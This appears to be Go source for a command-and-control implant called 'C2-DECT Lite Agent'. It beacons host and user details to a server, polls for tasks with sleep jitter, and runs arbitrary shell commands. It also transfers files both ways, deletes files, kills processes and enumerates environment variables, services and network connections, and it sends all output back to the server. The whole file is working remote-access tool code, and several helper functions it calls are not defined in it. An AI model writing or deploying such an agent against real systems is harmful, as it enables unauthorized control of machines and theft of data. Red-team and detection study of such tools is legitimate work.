package main

import (
	"bytes"
	"crypto/ecdh"
	cryptorand "crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type AgentConfig struct {
	ServerURL  string
	ServerPort uint16
	SleepSec   uint32
	Jitter     uint32
	SessionID  string
	AESKey     []byte
	PrivateKey *ecdh.PrivateKey
}

type Beacon struct {
	SessionID  string `json:"session_id"`
	Hostname   string `json:"hostname"`
	Username   string `json:"username"`
	InternalIP string `json:"internal_ip"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	PID        int    `json:"pid"`
	Process    string `json:"process"`
	SleepSec   uint32 `json:"sleep_sec"`
}

type Task struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
	Args    string `json:"args"`
}

type Result struct {
	TaskID  int64  `json:"task_id"`
	Output  string `json:"output"`
	Error   string `json:"error"`
	Success bool   `json:"success"`
}

func main() {
	config := AgentConfig{
		ServerURL:  "127.0.0.1",
		ServerPort: 8443,
		SleepSec:   10,
		Jitter:     30,
	}

	// Parse args
	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "-s", "--server":
			if i+1 < len(os.Args) {
				config.ServerURL = os.Args[i+1]
				i++
			}
		case "-p", "--port":
			if i+1 < len(os.Args) {
				port, _ := strconv.Atoi(os.Args[i+1])
				config.ServerPort = uint16(port)
				i++
			}
		case "-S", "--sleep":
			if i+1 < len(os.Args) {
				sleep, _ := strconv.Atoi(os.Args[i+1])
				config.SleepSec = uint32(sleep)
				i++
			}
		}
	}

	// Generate session ID
	rand_bytes := make([]byte, 8)
	cryptorand.Read(rand_bytes)
	config.SessionID = hex.EncodeToString(rand_bytes)[:16]

	hostname, _ := os.Hostname()
	config.SessionID = hostname + "_" + config.SessionID[:8]

	fmt.Printf("[*] C2-DECT Lite Agent v1.0\n")
	fmt.Printf("[*] Server: %s:%d\n", config.ServerURL, config.ServerPort)
	fmt.Printf("[*] Session: %s\n", config.SessionID)

	// Key exchange
	keyExchange(&config)

	// Main loop
	for {
		sendBeacon(&config)
		checkAndExecute(&config)

		sleepTime := int64(config.SleepSec)*1000 + (rand.Int63n(int64(config.SleepSec)*1000*int64(config.Jitter)/100)*2 - int64(config.SleepSec)*1000*int64(config.Jitter)/100)
		if sleepTime < 1000 {
			sleepTime = 1000
		}
		time.Sleep(time.Duration(sleepTime) * time.Millisecond)
	}
}

func keyExchange(config *AgentConfig) {
	curve := ecdh.P256()
	privKey, _ := curve.GenerateKey(cryptorand.Reader)
	config.PrivateKey = privKey

	pubBytes := privKey.PublicKey().Bytes()
	body := fmt.Sprintf(`{"session_id":"%s","public_key":"%s"}`, config.SessionID, hex.EncodeToString(pubBytes))

	resp, err := http.Post(fmt.Sprintf("http://%s:%d/agent/key/exchange", config.ServerURL, config.ServerPort),
		"application/json", strings.NewReader(body))
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var result map[string]string
	json.NewDecoder(resp.Body).Decode(&result)

	if serverPubHex, ok := result["public_key"]; ok {
		serverPubBytes, _ := hex.DecodeString(serverPubHex)
		serverPubKey, _ := curve.NewPublicKey(serverPubBytes)
		sharedSecret, _ := privKey.ECDH(serverPubKey)
		hash := sha256.Sum256(sharedSecret)
		config.AESKey = hash[:]
	}
}

func sendBeacon(config *AgentConfig) {
	hostname, _ := os.Hostname()
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	beacon := Beacon{
		SessionID: config.SessionID,
		Hostname:  hostname,
		Username:  username,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		PID:       os.Getpid(),
		Process:   "agent-lite",
		SleepSec:  config.SleepSec,
	}

	data, _ := json.Marshal(beacon)
	url := fmt.Sprintf("http://%s:%d/agent/checkin", config.ServerURL, config.ServerPort)
	resp, err := http.Post(url, "application/json", bytes.NewReader(data))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func checkAndExecute(config *AgentConfig) {
	url := fmt.Sprintf("http://%s:%d/agent/task/pending?session_id=%s",
		config.ServerURL, config.ServerPort, config.SessionID)
	resp, err := http.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if result["status"] != "task" {
		return
	}

	taskMap := result["task"].(map[string]interface{})
	task := Task{
		ID:      int64(taskMap["id"].(float64)),
		Command: taskMap["command"].(string),
		Args:    taskMap["args"].(string),
	}

	output := ""
	errStr := ""
	success := true

	// Parse command: if command contains space, split into base command + args
	baseCmd := task.Command
	cmdArgs := task.Args
	if cmdArgs == "" && strings.Contains(task.Command, " ") {
		parts := strings.SplitN(task.Command, " ", 2)
		baseCmd = parts[0]
		cmdArgs = parts[1]
	}

	switch baseCmd {
	case "shell":
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd.exe", "/C", cmdArgs)
		} else {
			cmd = exec.Command("sh", "-c", cmdArgs)
		}
		out, err := cmd.CombinedOutput()
		output = string(out)
		if err != nil {
			errStr = err.Error()
			success = false
		}

	case "sleep":
		secs, _ := strconv.Atoi(cmdArgs)
		if secs > 0 {
			config.SleepSec = uint32(secs)
			output = fmt.Sprintf("Sleep set to %d seconds", secs)
		}

	case "ls", "dir":
		output, err = listFiles(cmdArgs)
		if err != nil {
			errStr = err.Error()
			success = false
		}

	case "cat", "type":
		data, err := readFile(cmdArgs)
		if err != nil {
			errStr = err.Error()
			success = false
		} else {
			output = string(data)
		}

	case "upload":
		// Args format: remote_path|base64_data
		parts := strings.SplitN(cmdArgs, "|", 2)
		if len(parts) == 2 {
			data, _ := base64.StdEncoding.DecodeString(parts[1])
			// If no path specified, save to uploads folder
			targetPath := parts[0]
			if targetPath == "" {
				dataDir := getDataDir()
				targetPath = filepath.Join(dataDir, "uploads", fmt.Sprintf("upload_%d.bin", time.Now().UnixMilli()))
			}
			err := writeFile(targetPath, data)
			if err != nil {
				errStr = err.Error()
				success = false
			} else {
				output = fmt.Sprintf("File uploaded: %s (%d bytes)", targetPath, len(data))
			}
		} else {
			errStr = "Usage: upload remote_path|base64_data"
			success = false
		}

	case "download":
		data, err := readFile(cmdArgs)
		if err != nil {
			errStr = err.Error()
			success = false
		} else {
			// Also save a copy to downloads folder
			dataDir := getDataDir()
			filename := filepath.Base(cmdArgs)
			if filename == "" || filename == "." {
				filename = fmt.Sprintf("download_%d.bin", time.Now().UnixMilli())
			}
			dlPath := filepath.Join(dataDir, "downloads", filename)
			os.WriteFile(dlPath, data, 0644)
			output = base64.StdEncoding.EncodeToString(data)
		}

	case "cp", "copy":
		parts := strings.Split(cmdArgs, " ")
		if len(parts) == 2 {
			err := copyFile(parts[0], parts[1])
			if err != nil {
				errStr = err.Error()
				success = false
			} else {
				output = fmt.Sprintf("Copied: %s -> %s", parts[0], parts[1])
			}
		}

	case "mv", "move":
		parts := strings.Split(cmdArgs, " ")
		if len(parts) == 2 {
			err := moveFile(parts[0], parts[1])
			if err != nil {
				errStr = err.Error()
				success = false
			} else {
				output = fmt.Sprintf("Moved: %s -> %s", parts[0], parts[1])
			}
		}

	case "rm", "del":
		err := deleteFile(cmdArgs)
		if err != nil {
			errStr = err.Error()
			success = false
		} else {
			output = fmt.Sprintf("Deleted: %s", cmdArgs)
		}

	case "mkdir":
		err := createDirectory(cmdArgs)
		if err != nil {
			errStr = err.Error()
			success = false
		} else {
			output = fmt.Sprintf("Created: %s", cmdArgs)
		}

	case "find", "search":
		parts := strings.Split(cmdArgs, " ")
		if len(parts) == 2 {
			output, err = searchFiles(parts[0], parts[1])
			if err != nil {
				errStr = err.Error()
				success = false
			}
		}

	case "ps", "processes":
		output, err = getProcessList()
		if err != nil {
			errStr = err.Error()
			success = false
		}

	case "kill":
		err := killProcess(cmdArgs)
		if err != nil {
			errStr = err.Error()
			success = false
		} else {
			output = fmt.Sprintf("Process %s killed", cmdArgs)
		}

	case "sysinfo":
		output, err = getSystemInfo()
		if err != nil {
			errStr = err.Error()
			success = false
		}

	case "netinfo":
		output, err = getNetworkInfo()
		if err != nil {
			errStr = err.Error()
			success = false
		}

	case "services":
		output, err = getRunningServices()
		if err != nil {
			errStr = err.Error()
			success = false
		}

	case "env":
		output, err = getEnvironmentVars()
		if err != nil {
			errStr = err.Error()
			success = false
		}

	case "connections", "netstat":
		output, err = getConnections()
		if err != nil {
			errStr = err.Error()
			success = false
		}

	case "exit":
		os.Exit(0)

	default:
		// If unknown command, try to run as shell
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd.exe", "/C", task.Command)
		} else {
			cmd = exec.Command("sh", "-c", task.Command)
		}
		out, err := cmd.CombinedOutput()
		output = string(out)
		if err != nil {
			errStr = err.Error()
			success = false
		}
	}

	resultData := Result{
		TaskID:  task.ID,
		Output:  output,
		Error:   errStr,
		Success: success,
	}

	resultJSON, _ := json.Marshal(resultData)
	url = fmt.Sprintf("http://%s:%d/agent/task/result", config.ServerURL, config.ServerPort)
	http.Post(url, "application/json", bytes.NewReader(resultJSON))
}
